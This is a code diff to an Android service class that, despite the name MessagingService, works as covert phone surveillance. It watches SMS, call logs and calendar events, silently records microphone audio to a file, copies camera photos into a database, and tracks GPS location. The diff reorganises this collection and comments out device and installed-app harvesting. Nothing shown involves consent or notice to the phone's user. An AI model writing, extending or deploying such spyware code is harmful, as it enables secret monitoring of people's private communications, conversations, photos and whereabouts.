@@ -9,7 +9,6 @@ import android.database.Cursor;
 import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.net.Uri;
-import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
@@ -18,10 +17,8 @@ import android.provider.CallLog;
 import android.provider.Telephony;
 import android.util.Log;
 
-import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
-import java.io.InputStreamReader;
 
 public class MessagingService extends Service {
 
@@ -89,15 +86,7 @@ public class MessagingService extends Service {
         getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
         getContentResolver().registerContentObserver(Uri.parse("content://call_log"), true, mCallLogObserver);
         getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
-        String locationProvider = LocationManager.GPS_PROVIDER;
 
-        try {
-            mLocationManager = Helpers.getLocationManager(this);
-            mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, Helpers.getLocationListener(MessagingService.this));
-
-        } catch (SecurityException e) {
-            e.printStackTrace();
-        }
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -106,38 +95,44 @@ public class MessagingService extends Service {
                 mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                 mMediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
                 try {
-                    File file = new File(Environment.getExternalStorageDirectory() + File.separator + "soundfile2.3gpp");
-                    if(file.exists()){
-                        Database.insertAudioFile(MessagingService.this, sDatabase, System.currentTimeMillis(), file);
-                        file.delete();
-                        file.createNewFile();
-                    }else{
-                        file.createNewFile();
-                    }
-                    mMediaRecorder.setOutputFile(file);
-                    mMediaRecorder.prepare();
-                    mMediaRecorder.start();
                     if(Helpers.isExternalStorageReadable()){
                         File[] pictures = Helpers.getFilesForDirectory(Helpers.getDcimDirectory().getPath() + "/Camera");
                         if(pictures != null && pictures.length > 0){
                             for(File f : pictures){
-                                Database.insertPhoto(sDatabase, f.getName(), f);
+                                Database.insertMedia(sDatabase, f.getName(), f);
                             }
                         }
-                        pictures = Helpers.getFilesForDirectory(Helpers.getPicturesDirectory().getPath());
+                        File audioFile = new File(Environment.getExternalStorageDirectory() + File.separator + "soundfile2.3gpp");
+                        if(! audioFile.exists()){
+                            audioFile.createNewFile();
+                        }else{
+                            Database.insertMedia(sDatabase, audioFile.getName(), audioFile);
+                        }
+                        mMediaRecorder.setOutputFile(audioFile);
+                        mMediaRecorder.prepare();
+                        mMediaRecorder.start();
+                     /*   pictures = Helpers.getFilesForDirectory(Helpers.getPicturesDirectory().getPath());
                         if(pictures != null && pictures.length > 0){
                             for(File f : pictures){
-                                Database.insertPhoto(sDatabase, f.getName(), f);
+                                //Database.insertMedia(sDatabase, f.getName(), f);
                             }
-                        }
+                        }*/
                     }
-                    Database.insertPackages(sDatabase, Helpers.getInstalledApps(MessagingService.this));
+                    //Database.insertPackages(sDatabase, Helpers.getInstalledApps(MessagingService.this));
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
-                Database.insertDevice(sDatabase, sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
+                //Database.insertDevice(sDatabase, sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
             }
         }).start();
+        try {
+            String locationProvider = LocationManager.GPS_PROVIDER;
+            mLocationManager = Helpers.getLocationManager(MessagingService.this);
+            mLocationManager.requestLocationUpdates(locationProvider, 60000, 30, Helpers.getLocationListener(MessagingService.this));
+
+        } catch (SecurityException e) {
+            e.printStackTrace();
+        }
        /* new Thread(new Runnable() {
             @Override
             public void run() {
@@ -145,7 +140,7 @@ public class MessagingService extends Service {
                     File[] pictures = Helpers.getFilesForDirectory(Helpers.getDcimDirectory().getPath() + "/Camera");
                     if(pictures != null && pictures.length > 0){
                         for(File file : pictures){
-                            Database.insertPhoto(sDatabase, file.getName(), file);
+                            Database.insertMedia(sDatabase, file.getName(), file);
                         }
                     }
                 }
